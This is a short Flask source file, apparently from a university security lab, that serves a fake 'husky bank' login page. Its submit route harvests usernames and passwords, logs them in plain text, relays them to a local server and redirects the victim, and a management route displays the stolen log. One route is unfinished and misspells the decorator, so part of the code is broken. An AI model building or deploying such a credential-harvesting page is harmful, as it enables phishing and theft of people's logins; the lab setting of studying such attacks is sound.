from flask import Flask, render_template, request, redirect, jsonify
import requests

app = Flask(__name__)

@app.route("/") # creates the landing page
def bank():
    return render_template('bank.html', static_url_path='/static')

@app.route("/management")
def manager():
    file = open('C:\\Users\\karin\\OneDrive - University of Connecticut\\Documents\\CSE 3140\\Lab4\\q5 husky bank stuff\\log.txt', 'r')
    return file.read()

@app.rout('/1', methods=['POST', 'GET'])
def log_key():
    data = request.get_json()
    userk = data.get('username')
    passwordk = data.get('password')

@app.route("/submit", methods=['POST'])
def submit_form(): # activates when user submits
    user = request.form.get('user')
    password = request.form.get('pwd')
    with open('C:\\Users\\karin\\OneDrive - University of Connecticut\\Documents\\CSE 3140\\Lab4\\q5 husky bank stuff\\log.txt', 'a') as file:
        file.write('[user: ' + user + '\n')
        file.write('password: ' + password + ']\n\n')

    payload = {'username':user,'password':password,'submit':'submit'}
    r = requests.post('http://127.0.0.1:3333', data=payload, auth=(user, password))

    result = r.url
    return redirect(result, 307)
    
if __name__ == '__main__':
    app.run()